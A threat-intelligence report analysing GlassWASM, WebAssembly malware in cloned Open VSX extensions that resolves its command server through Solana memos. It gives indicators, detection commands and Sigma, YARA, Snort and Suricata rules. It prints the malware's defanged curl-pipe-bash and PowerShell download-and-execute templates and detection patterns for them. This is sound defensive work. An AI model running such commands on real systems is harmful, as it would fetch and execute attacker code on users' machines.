# Technical Analysis Report: GlassWASM -- WebAssembly Malware in Trojanized Open VSX Extensions (2026-06-21)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-06-21
Version: 2.0 (REVISED)

## Executive Summary

GlassWASM is a novel WebAssembly-based malware variant discovered in trojanized Visual Studio Code extensions published to the Open VSX Registry. Attributed with medium confidence to the GlassWorm threat actor, the campaign represents the first documented use of TinyGo-compiled WebAssembly as a stager by this group. Two extensions -- `exargd/vsblack@0.0.1` and `noellee-doc/flint-debug@0.1.1` -- were published on June 9-10, 2026 by a freshly created GitHub account (`zaitoona43`) using identity-cloned namespaces of legitimate VS Code Marketplace extensions. The WASM payload uses ChaCha20 encryption to defeat static string extraction, resolves its C2 host via Solana blockchain SPL Memo transactions to a watched wallet, and then constructs platform-specific download-and-execute commands (`curl | bash` on macOS/Linux, `irm | iex` on Windows) executed through Node.js `child_process.execSync()`. The primary impact surface is developers using VS Code forks that default to the Open VSX registry -- VSCodium, Cursor, Windsurf, and Gitpod.

## Background: GlassWorm Campaign

GlassWASM represents a new evolution of the GlassWorm supply-chain campaign, which between November 2025 and March 2026 compromised over 400 components across npm, the VS Code Marketplace, Open VSX, and GitHub. GlassWorm's defining innovation is the use of Solana transaction memos sent to a watched wallet as a takedown-resistant C2 dead-drop channel. The GlassWASM variant introduces a significant tactical shift: instead of obfuscated JavaScript stagers, the malware logic is compiled into TinyGo WebAssembly modules, moving the entire decision tree out of inspectable script and into a binary format that resists conventional static analysis.

The two carriers are identity-cloned from legitimate, verified VS Code Marketplace extensions -- not typosquats -- exploiting a cross-registry trust gap where Open VSX does not verify namespace ownership against the VS Code Marketplace. The malicious publisher account `zaitoona43` (GitHub UID 291961103) was created approximately three days before publication.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2025-11 (est.) | GlassWorm campaign begins targeting npm, VS Code Marketplace, Open VSX |
| 2026-03 | 72 additional malicious Open VSX extensions discovered linked to GlassWorm |
| 2026-05-23 | Earliest confirmed SPL Memo transaction to watched wallet |
| 2026-06-07 (est.) | GitHub account `zaitoona43` created |
| 2026-06-09 | `exargd/vsblack@0.0.1` published to Open VSX |
| 2026-06-10 | `noellee-doc/flint-debug@0.1.1` published to Open VSX |
| 2026-06-11 | Analysis date; C2 host `dodod[.]lat` resolved from live Solana memo |
| 2026-06-15 | Corgea publishes supplementary analysis |
| 2026-06-20 | SecurityOnline publishes advisory |

## Root Cause: Open VSX Cross-Registry Trust Gap

The Open VSX Registry does not verify publisher namespace ownership against the VS Code Marketplace. This allows attackers to register identically-named publisher namespaces and upload clones of legitimate extensions, inheriting the trust associated with the original names. The extensions use the `onStartupFinished` activation event, ensuring the WASM payload executes automatically when the editor starts.

## Technical Analysis of the Malicious Payload

### 1. Extension Package Structure

Both VSIX packages (ZIP-based format) contain a minimal JavaScript shim alongside a TinyGo-compiled WebAssembly module. The WASM files use randomized filenames (`snqpkebiwrxmoivl.wasm`, `orybbbdsuqmaapel.wasm`) and are auto-executed on extension activation via an appended bootstrap triggered by the `onStartupFinished` event.

### 2. WebAssembly Payload (TinyGo)

The WASM module is compiled with TinyGo targeting `js/wasm` and exhibits the following characteristics:

- **Format**: WebAssembly MVP (v1), clean validation
- **Size**: 824,552 bytes
- **Functions**: 478 (code section), 45 data segments (bulk-memory enabled)
- **Exports**: `go_scheduler`, `asyncify_start_unwind`, `asyncify_stop_unwind`, `asyncify_start_rewind`
- **Imports**: TinyGo `gojs` bridge (`gojs.syscall/js.valueCall`, `gojs.syscall/js.valueInvoke`, `gojs.runtime.ticks`), WASI primitives (`fd_write`, `proc_exit`, `random_get`)
- **Obfuscation**: All meaningful strings encrypted with ChaCha20 (textbook implementation, 256-bit key, 20 rounds, zero nonce). Debug and name sections stripped.

The ChaCha20 implementation uses the standard sigma constant `expand 32-byte k` at memory offset `0x10000`, with the key buffer at BSS offset `0x211CC` populated only at runtime, defeating static key extraction.

### 3. C2 Resolution via Solana Blockchain

The WASM module polls the Solana blockchain's public RPC API (`hxxps://api[.]mainnet[.]solana[.]com`) to resolve its C2 host:

1. Calls `getSignaturesForAddress` for wallet `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz`
2. Fetches the latest transaction via `getTransaction` with `jsonParsed` encoding
3. Parses instructions targeting SPL Memo program IDs:
   - `MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr` (v2)
   - `Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM` (v1)
4. Strips the numeric length prefix from the memo format `[N] payload`
5. The recovered payload as of 2026-06-11 was `[9] dodod.lat`

This mechanism provides takedown-resistant infrastructure -- the attacker can rotate the C2 host by posting a new Solana transaction without modifying the malware.

### 4. Platform-Specific Payload Delivery

After resolving the C2 host, the WASM module detects the platform via `process.platform` and constructs download-and-execute commands:

| Platform | Command Template |
|----------|-----------------|
| macOS | `curl -fsSL hxxps://<c2>/darwin/i/_ \| bash` |
| Linux | `curl -fsSL hxxps://<c2>/linux/i/_ \| bash` |
| Windows | `powershell -Command "irm hxxps://<c2>/win32/i/_ \| iex"` |

Execution is performed via `require('child_process').execSync(cmd, {windowsHide: true})` to suppress console windows on Windows.

### 5. Affected Editor Platforms

Any VS Code fork defaulting to the Open VSX Registry is at risk:
- VSCodium
- Cursor
- Windsurf
- Gitpod
- Other Open VSX consumers

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation: URLs use `hxxps://`, domains use `[.]`, IP addresses use `[.]`.

### File System

| Artifact | Hash (SHA256) | Description |
|----------|---------------|-------------|
| WASM payload (`snqpkebiwrxmoivl.wasm` / `orybbbdsuqmaapel.wasm`) | `558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f` | TinyGo-compiled WASM module (SHA1: `8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4`, MD5: `4e143876eeaf5e767a9971f603b0f13c`, 824,552 bytes) |
| `noellee-doc.flint-debug-0.1.1.vsix` | `3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58` | Trojanized VSIX package (SHA1: `c0ed7d575fe8085e942898c9a26f15992c895ba9`, MD5: `b262b8d2ac2f0ab3c78251db44ecf3ac`) |
| `exargd.vsblack-0.0.1.vsix` | `1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25` | Trojanized VSIX package (SHA1: `824e601b599b9ad97ee12f0b3a72efd20ba59d47`, MD5: `f595fb7867bef76b4deab53fa328e0a2`) |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | `dodod[.]lat` | C2 host resolved from Solana memo (as of 2026-06-11) |
| URL Pattern | `hxxps://dodod[.]lat/darwin/i/_` | macOS stage-3 download |
| URL Pattern | `hxxps://dodod[.]lat/linux/i/_` | Linux stage-3 download |
| URL Pattern | `hxxps://dodod[.]lat/win32/i/_` | Windows stage-3 download |
| Solana RPC | `hxxps://api[.]mainnet[.]solana[.]com` | Abused for C2 dead-drop resolution |

### Blockchain

| Type | Value | Context |
|------|-------|---------|
| Solana Wallet | `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz` | Watched wallet for C2 memo transactions |
| SPL Memo Program | `MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr` | Memo v2 program ID (parsing target) |
| SPL Memo Program | `Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM` | Memo v1 program ID (parsing target) |

### Open VSX Identifiers

| Type | Value | Context |
|------|-------|---------|
| Extension | `exargd/vsblack[at]0.0.1` | Trojanized clone of ExarGD.vsblack |
| Extension | `noellee-doc/flint-debug[at]0.1.1` | Trojanized clone of noellee-doc.flint-debug |
| Publisher Account | `zaitoona43` (GitHub UID 291961103) | Malicious uploader account |
| WASM Filename | `snqpkebiwrxmoivl.wasm` | Payload in vsblack |
| WASM Filename | `orybbbdsuqmaapel.wasm` | Payload in flint-debug |

### Behavioral

- Node.js process spawning `bash`, `curl`, or `powershell` child processes
- `child_process.execSync()` with `windowsHide: true` option
- JSON-RPC calls to Solana mainnet from non-blockchain-developer contexts
- `.wasm` files alongside minimal JavaScript shims in VS Code extension directories
- ChaCha20 sigma constant `expand 32-byte k` embedded in WASM data sections
- Extension directories: `~/.vscode/extensions/`, `~/.vscode-oss/extensions/`, `~/.cursor/extensions/`, `~/.windsurf/extensions/`

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Trojanized VS Code extensions published to Open VSX under impersonated namespaces |
| T1102.001 | Web Service: Dead Drop Resolver | Solana blockchain SPL Memo transactions used as takedown-resistant C2 resolver |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | `curl -fsSL ... \| bash` download-execute on macOS/Linux |
| T1059.001 | Command and Scripting Interpreter: PowerShell | `irm ... \| iex` download-execute on Windows |
| T1105 | Ingress Tool Transfer | Platform-specific payload download from `dodod[.]lat/<platform>/i/_` |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTPS C2 communication and Solana JSON-RPC over HTTPS |
| T1027.002 | Obfuscated Files or Information: Software Packing | TinyGo-compiled WASM with ChaCha20 string encryption |
| T1204.002 | User Execution: Malicious File | Extension activates on `onStartupFinished` event in the editor |
| T1036.005 | Masquerading: Match Legitimate Name or Location | Identity-cloned extensions matching legitimate VS Code Marketplace publishers |

## Detection & Remediation

### Immediate Detection

```bash
# Check for known malicious WASM payload hashes
find ~/.vscode/extensions ~/.vscode-oss/extensions ~/.cursor/extensions ~/.windsurf/extensions -name "*.wasm" -exec sha256sum {} \; 2>/dev/null | grep "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"

# Check for known malicious extension directories
ls -la ~/.vscode-oss/extensions/ ~/.cursor/extensions/ ~/.windsurf/extensions/ 2>/dev/null | grep -iE "vsblack|flint-debug"

# Check for known WASM payload filenames
find ~/.vscode/extensions ~/.vscode-oss/extensions ~/.cursor/extensions ~/.windsurf/extensions -name "snqpkebiwrxmoivl.wasm" -o -name "orybbbdsuqmaapel.wasm" 2>/dev/null

# Check DNS logs for C2 domain
grep "dodod.lat" /var/log/dns* /var/log/syslog 2>/dev/null
```

### Remediation

1. **Containment**: Block `dodod[.]lat` at DNS/proxy perimeter; monitor for Solana RPC traffic from extension host processes
2. **Eradication**: Remove `exargd.vsblack` and `noellee-doc.flint-debug` extensions from all affected editor installations; delete associated WASM files
3. **Recovery**: Audit all systems that had the extensions installed for evidence of stage-3 payload execution; check process trees for `node -> bash/curl/powershell` chains
4. **Secret Rotation**: Assume credentials and tokens accessible from affected developer workstations are compromised

## Detection Rules

The following rules target GlassWASM IOCs and behavioral patterns at host, file, and network layers. Three Sigma rules cover Node.js spawning download-execute commands (IOC-anchored to C2 URL patterns), Solana RPC abuse with the watched wallet address, and C2 domain resolution. A fourth Sigma rule (WASM file creation in extension directories) was dropped due to unacceptable false positive rates -- legitimate extensions routinely bundle WASM modules. Three YARA rules detect the WASM payload by known hashes, TinyGo structural indicators, and ChaCha20 signatures. Five Snort and six Suricata rules identify C2 HTTP traffic and DNS resolution, with platform-specific URL path rules anchored to the `dodod[.]lat` domain to prevent generic matching. The C2 domain rules carry high confidence as `dodod[.]lat` has no legitimate use.

### Sigma: GlassWASM -- Node.js Spawning Suspicious Download-Execute Commands
Detects Node.js spawning curl-pipe-bash or PowerShell download-execute commands consistent with GlassWASM stage-3 delivery. Every branch requires the C2 URL anchor (`selection_c2_url`) to avoid firing on generic curl|bash or irm|iex patterns.
**compile: sigma check pass, sigma convert splunk pass** | **confidence: medium** (TTP-level with IOC anchor; legitimate Node.js build scripts are unlikely to hit the C2 URL patterns)

```yaml
title: GlassWASM - Node.js Spawning Suspicious Download-Execute Commands
id: a1f3c8e2-7d45-4b9a-8e6f-1c2d3e4f5a6b
status: experimental
description: >
  Detects Node.js processes spawning curl-pipe-bash or PowerShell download-execute
  commands consistent with GlassWASM malware stage-3 payload delivery from trojanized
  Open VSX extensions. Every branch requires the C2 URL anchor to reduce false positives.
references:
  - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
  - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner CTI
date: 2026-06-21
tags:
  - attack.t1059.004
  - attack.t1059.001
  - attack.t1105
logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\node.exe'
      - '/node'
  selection_curl_bash:
    CommandLine|contains|all:
      - 'curl'
      - '-fsSL'
      - '| bash'
  selection_powershell:
    CommandLine|contains|all:
      - 'irm'
      - '| iex'
  selection_c2_url:
    CommandLine|contains:
      - '/darwin/i/_'
      - '/linux/i/_'
      - '/win32/i/_'
      - 'dodod.lat'
  condition: selection_parent and selection_c2_url and (selection_curl_bash or selection_powershell)
falsepositives:
  - Legitimate Node.js build scripts that download and execute platform-specific installers from domains containing the C2 URL patterns
level: high
```

<!-- revision: v2.0 Sigma 1 -- removed product:windows (cross-platform rule); changed condition to require selection_c2_url in every branch to prevent unanchored curl|bash/irm|iex firing -->
<!-- AUDIT: TTP-level rule detecting Node.js child process spawning download-execute commands. Parent process constraint narrows scope. C2 URL anchor required in every branch. Validated: sigma check 0 errors, sigma convert --without-pipeline -t splunk pass. -->

### Sigma: GlassWASM -- Solana RPC Calls from VS Code Extension Host
Detects Solana mainnet RPC calls containing the GlassWASM watched wallet address, indicating blockchain-based C2 dead-drop resolution.
**compile: sigma check pass, sigma convert splunk pass** | **confidence: low** (wallet address is IOC-anchored but Solana RPC from proxy logs may have limited visibility)

```yaml
title: GlassWASM - Solana RPC Calls from VS Code Extension Host
id: b2e4d9f3-8e56-4c0b-9f70-2d3e4f5a6b7c
status: experimental
description: >
  Detects HTTP requests to Solana mainnet RPC endpoints containing the GlassWASM
  watched wallet address, indicating C2 dead-drop resolution via blockchain memos.
references:
  - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
  - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner CTI
date: 2026-06-21
tags:
  - attack.t1102.001
  - attack.t1071.001
logsource:
  category: proxy
detection:
  selection_solana:
    r-dns|contains:
      - 'api.mainnet-beta.solana.com'
      - 'api.mainnet.solana.com'
  selection_wallet:
    cs-body|contains:
      - '6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz'
  condition: selection_solana and selection_wallet
falsepositives:
  - Legitimate Solana applications querying the same wallet address
level: low
```

<!-- revision: v2.0 Sigma 2 -- replaced non-standard c-useragent with standard r-dns for proxy category; removed overly broad selection_process and selection_methods; added wallet address IOC anchor (selection_wallet) so rule no longer fires on any Solana RPC call; aligned level:low with confidence:low -->
<!-- AUDIT: IOC-anchored behavioral rule. Wallet address prevents generic Solana RPC matches. r-dns is Sigma-standard for proxy category. Validated: sigma check 0 errors, sigma convert --without-pipeline -t splunk pass. -->

### Sigma: GlassWASM -- C2 Domain DNS Lookup (dodod.lat)
Detects DNS resolution of the known GlassWASM C2 domain.
**compile: sigma check pass, sigma convert splunk pass, sigma convert log_scale pass** | **confidence: high**

```yaml
title: GlassWASM - C2 Domain DNS Lookup (dodod.lat)
id: c3f5e0a4-9f67-4d1c-a081-3e4f5a6b7c8d
status: experimental
description: >
  Detects DNS resolution of the GlassWASM C2 domain dodod.lat, used to serve
  platform-specific second-stage payloads after dead-drop resolution via Solana
  blockchain memos.
references:
  - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
  - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner CTI
date: 2026-06-21
tags:
  - attack.t1071.001
  - attack.t1105
logsource:
  category: dns
detection:
  selection:
    query|endswith:
      - 'dodod.lat'
  condition: selection
falsepositives:
  - Unlikely in enterprise environments
level: high
```

<!-- AUDIT: IOC-anchored domain rule. dodod.lat has no legitimate use. High confidence. Validated: sigma check 0 errors, sigma convert --without-pipeline -t splunk pass ("query="*dodod.lat""), sigma convert --without-pipeline -t log_scale pass (query=/dodod\.lat$/i). -->

<!-- revision: v2.0 Sigma 4 DROPPED -- "WASM File Created in VS Code Extension Directory" matched ANY .wasm in ANY extension directory; legitimate extensions (language servers, tree-sitter, etc.) routinely bundle WASM modules, creating unacceptable FP rates. Altitude violation with no IOC anchor. -->

### YARA: GlassWASM WASM Payload, VSIX Package, and TinyGo Behavioral Heuristic
Three YARA rules targeting the known WASM payload (by hash and structural indicators), the trojanized VSIX packages (by hash and embedded filenames), and a behavioral heuristic for suspicious TinyGo WASM with ChaCha20 encryption.
**compile: yarac pass** | **confidence: high** (payload hash/structure), **high** (VSIX hash/filename), **low** (TinyGo behavioral heuristic)

> **Note on string branches**: The report documents that the WASM payload encrypts all meaningful strings with ChaCha20 at rest. The `$solana*` and `$cp*` string branches in `GlassWASM_WASM_Payload` target unencrypted variants (e.g., debug builds, memory dumps, or future builds where encryption is disabled). The primary detection path for the encrypted production payload is the SHA256 hash match. The structural TinyGo+ChaCha20+child_process branch fires only when those strings are visible in cleartext.

```yara
import "hash"

rule GlassWASM_WASM_Payload
{
    meta:
        description = "Detects GlassWASM TinyGo-compiled WebAssembly payload by known hashes and structural indicators"
        author = "Actioner CTI"
        date = "2026-06-21"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        hash1 = "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"
        severity = "high"
        note = "String branches ($solana*, $cp*) target unencrypted variants. The production payload encrypts these strings with ChaCha20 at rest; they become visible only during dynamic analysis or if encryption is disabled in future builds."

    strings:
        // WebAssembly magic bytes
        $wasm_magic = { 00 61 73 6D 01 00 00 00 }

        // TinyGo gojs bridge imports
        $tinygo_import1 = "gojs.syscall/js.valueCall" ascii
        $tinygo_import2 = "gojs.syscall/js.valueInvoke" ascii
        $tinygo_import3 = "gojs.runtime.ticks" ascii

        // ChaCha20 sigma constant
        $chacha_sigma = "expand 32-byte k" ascii

        // Solana-related strings (visible in unencrypted variants or memory dumps)
        $solana1 = "getSignaturesForAddress" ascii
        $solana2 = "getTransaction" ascii
        $solana3 = "spl-memo" ascii

        // child_process abuse indicators (visible in unencrypted variants or memory dumps)
        $cp1 = "child_process" ascii
        $cp2 = "execSync" ascii
        $cp3 = "windowsHide" ascii

    condition:
        $wasm_magic at 0 and
        (
            // Known hash match
            hash.sha256(0, filesize) == "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"
            or
            // TinyGo WASM with ChaCha20 and child_process indicators
            (2 of ($tinygo_import*) and $chacha_sigma and 2 of ($cp*))
            or
            // TinyGo WASM with Solana C2 indicators
            (2 of ($tinygo_import*) and 2 of ($solana*))
        )
}

rule GlassWASM_VSIX_Package
{
    meta:
        description = "Detects known trojanized VSIX packages delivering GlassWASM payload"
        author = "Actioner CTI"
        date = "2026-06-21"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        hash1 = "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58"
        hash2 = "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25"
        severity = "critical"

    strings:
        // VSIX is a ZIP-based format
        $pk_header = { 50 4B 03 04 }

        // Extension identifiers (case-sensitive -- these are npm-style package names)
        $ext1 = "vsblack" ascii
        $ext2 = "flint-debug" ascii

        // WASM payload filenames
        $wasm_file1 = "snqpkebiwrxmoivl.wasm" ascii
        $wasm_file2 = "orybbbdsuqmaapel.wasm" ascii

        // onStartupFinished activation
        $activation = "onStartupFinished" ascii

    condition:
        $pk_header at 0 and
        (
            hash.sha256(0, filesize) == "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58" or
            hash.sha256(0, filesize) == "1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25" or
            (1 of ($wasm_file*) and $activation) or
            (1 of ($ext*) and 1 of ($wasm_file*))
        )
}

rule GlassWASM_TinyGo_WASM_Suspicious
{
    meta:
        description = "Detects suspicious TinyGo-compiled WASM files with encryption and process execution imports - behavioral heuristic"
        author = "Actioner CTI"
        date = "2026-06-21"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        severity = "low"
        note = "The ChaCha20 sigma constant alone is common in cryptographic binaries. This rule requires WASM-specific structural indicators (TinyGo imports, asyncify exports, WASI imports) to reduce false positives."

    strings:
        $wasm_magic = { 00 61 73 6D 01 00 00 00 }

        // TinyGo imports
        $tg1 = "gojs.syscall/js" ascii
        $tg2 = "go_scheduler" ascii

        // asyncify exports (TinyGo async support)
        $async1 = "asyncify_start_unwind" ascii
        $async2 = "asyncify_stop_unwind" ascii
        $async3 = "asyncify_start_rewind" ascii

        // ChaCha20 indicator
        $chacha = "expand 32-byte k" ascii

        // WASI imports
        $wasi1 = "fd_write" ascii
        $wasi2 = "proc_exit" ascii
        $wasi3 = "random_get" ascii

    condition:
        $wasm_magic at 0 and
        filesize > 500KB and filesize < 2MB and
        1 of ($tg*) and
        2 of ($async*) and
        $chacha and
        2 of ($wasi*)
}
```

<!-- revision: v2.0 YARA 1 -- added meta note documenting that $solana*/$cp* string branches target unencrypted variants; production payload uses ChaCha20 encryption making those strings invisible at rest -->
<!-- revision: v2.0 YARA 2 -- corrected SHA256 hash from 70-char malformed value to correct 64-char 3aa31999...f9e5d58 (source: socket.dev); removed nocase from $ext1/$ext2 (npm package names are case-sensitive) -->
<!-- revision: v2.0 YARA 3 -- lowered severity from medium to low; added meta note explaining ChaCha20 sigma constant appears in any ChaCha20/Salsa20 binary; WASM structural indicators reduce but do not eliminate FP risk -->
<!-- AUDIT: Three YARA rules compiled cleanly via yarac (exit 0). Corrected SHA256 hash verified against Socket.dev source (64 hex chars). No defanged values in YARA conditions. -->

### Snort: GlassWASM Network Detection (5 rules)
Five Snort rules covering C2 domain in HTTP Host header, platform-specific URL patterns (domain-anchored), and Solana RPC query with watched wallet address.
**compile: snort -T pass (rules placed in /etc/snort/rules/)** | **confidence: high** (C2 domain SID 2026062101), **high** (URL patterns SIDs 2026062102-2026062104), **high** (wallet+RPC SID 2026062105)

```
# GlassWASM C2 Domain Detection
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE GlassWASM C2 Domain (dodod.lat) in HTTP Host Header"; flow:to_server,established; content:"Host|3A| "; http_header; content:"dodod.lat"; http_header; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062101; rev:1;)

# GlassWASM Platform-Specific C2 URL Paths (domain-anchored)
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE GlassWASM Stage-3 Download URL Pattern (/darwin/i/_)"; flow:to_server,established; content:"dodod.lat"; http_header; content:"/darwin/i/_"; http_uri; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062102; rev:2;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE GlassWASM Stage-3 Download URL Pattern (/linux/i/_)"; flow:to_server,established; content:"dodod.lat"; http_header; content:"/linux/i/_"; http_uri; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062103; rev:2;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE GlassWASM Stage-3 Download URL Pattern (/win32/i/_)"; flow:to_server,established; content:"/win32/i/_"; http_uri; content:"dodod.lat"; http_header; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062104; rev:2;)

# GlassWASM Solana RPC getSignaturesForAddress with Watched Wallet
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"MALWARE GlassWASM Solana RPC getSignaturesForAddress Call"; flow:to_server,established; content:"getSignaturesForAddress"; http_client_body; content:"6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz"; http_client_body; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062105; rev:1;)
```

<!-- revision: v2.0 Snort SIDs 2026062102-04 -- added content:"dodod.lat"; http_header; domain anchor to each platform URL path rule (rev:1 -> rev:2); prevents firing on semi-generic URL paths without the C2 domain -->
<!-- AUDIT: Snort 2.9.20 validated via snort -c /etc/snort/snort.conf -T after placing rules in /etc/snort/rules/glasswasm.rules. "Snort successfully validated the configuration!" observed. SIDs in custom 2026MMDDNN range. All rules use flow:to_server,established. HTTP content modifiers (http_header, http_uri, http_client_body) applied. -->

### Suricata: GlassWASM Network Detection (6 rules)
Six Suricata rules using sticky-buffer syntax covering C2 domain HTTP and DNS, platform-specific URL patterns (domain-anchored), and Solana RPC with watched wallet address.
**compile: suricata -T pass** | **confidence: high** (C2 domain SIDs 2026062201, 2026062206), **high** (URL patterns SIDs 2026062202-2026062204), **high** (wallet+RPC SID 2026062205)

```
# GlassWASM C2 Domain Detection
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE GlassWASM C2 Domain (dodod.lat)"; flow:to_server,established; http.host; content:"dodod.lat"; endswith; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062201; rev:1;)

# GlassWASM Stage-3 URL Patterns (domain-anchored)
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE GlassWASM Stage-3 URL (/darwin/i/_)"; flow:to_server,established; http.host; content:"dodod.lat"; endswith; http.uri; content:"/darwin/i/_"; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062202; rev:2;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE GlassWASM Stage-3 URL (/linux/i/_)"; flow:to_server,established; http.host; content:"dodod.lat"; endswith; http.uri; content:"/linux/i/_"; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062203; rev:2;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE GlassWASM Stage-3 URL (/win32/i/_)"; flow:to_server,established; http.host; content:"dodod.lat"; endswith; http.uri; content:"/win32/i/_"; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062204; rev:2;)

# GlassWASM Solana RPC with Watched Wallet Address
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"MALWARE GlassWASM Solana RPC Query for Watched Wallet"; flow:to_server,established; http.method; content:"POST"; http.request_body; content:"getSignaturesForAddress"; content:"6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz"; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062205; rev:1;)

# GlassWASM DNS Lookup for C2 Domain
alert dns $HOME_NET any -> any any (msg:"MALWARE GlassWASM C2 DNS Query (dodod.lat)"; dns.query; content:"dodod.lat"; endswith; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; classtype:trojan-activity; sid:2026062206; rev:1;)
```

<!-- revision: v2.0 Suricata SIDs 2026062202-04 -- added http.host; content:"dodod.lat"; endswith; domain anchor to each platform URL path rule (rev:1 -> rev:2); prevents firing on semi-generic URL paths without the C2 domain -->
<!-- AUDIT: All 6 Suricata rules validated via suricata -T -S (v7.0.3). Configuration loaded successfully. Dot-notation sticky buffers used (http.host, http.uri, http.method, http.request_body, dns.query). SIDs in custom 2026MMDDNN range. -->

## Lessons Learned

1. **Cross-registry trust gaps**: Open VSX does not verify publisher namespace ownership against the VS Code Marketplace, allowing identity-cloned extensions to exploit the reputation of legitimate packages. This architectural gap makes identity impersonation trivially achievable and more dangerous than typosquatting.

2. **WebAssembly as evasion**: TinyGo-compiled WASM moves malware logic out of inspectable JavaScript into a binary format that resists static analysis. Traditional YARA rules keyed on plaintext strings will not fire when all meaningful strings are encrypted at rest with ChaCha20 and rebuilt only in memory at runtime.

3. **Blockchain C2 resilience**: The Solana memo dead-drop mechanism provides takedown-resistant infrastructure -- the attacker can rotate the C2 host by posting a new transaction without modifying the deployed malware. Domain blocklists become reactive rather than preventive, requiring blockchain-level monitoring of the watched wallet address.

4. **Developer tool attack surface**: VS Code forks (VSCodium, Cursor, Windsurf, Gitpod) that default to Open VSX inherit the registry's trust model, exposing developers who may assume their extensions are verified. Extension activation via `onStartupFinished` ensures malicious code runs without any user interaction beyond installation.

## Sources

- [Socket.dev -- GlassWASM: WebAssembly Malware Found in Trojanized Open VSX Extensions](https://socket.dev/blog/glasswasm-malware-open-vsx-extensions) -- primary technical analysis with IOCs, hashes, and WASM internals
- [SecurityOnline -- GlassWASM Malware Open VSX Extensions](https://securityonline.info/glasswasm-malware-open-vsx-extensions/) -- advisory with attack chain summary and attribution
- [Corgea -- GlassWASM Used TinyGo WebAssembly and Solana Memos in Trojanized Open VSX Extensions](https://corgea.com/research/glasswasm-open-vsx-solana-wasm-c2) -- supplementary analysis with CWE references and process chain IOCs
- [The Hacker News -- GlassWorm Supply-Chain Attack Abuses 72 Open VSX Extensions](https://thehackernews.com/2026/03/glassworm-supply-chain-attack-abuses-72.html) -- broader GlassWorm campaign context
- [SecurityWeek -- Dozens of Open VSX Extension Clones Linked to GlassWorm Malware](https://www.securityweek.com/dozens-of-open-vsx-extension-clones-linked-to-glassworm-malware/) -- additional campaign reporting

<!-- revision: v1.0 2026-06-21 DRAFT. 4 Sigma rules, 3 YARA rules, 5 Snort rules, 6 Suricata rules. -->
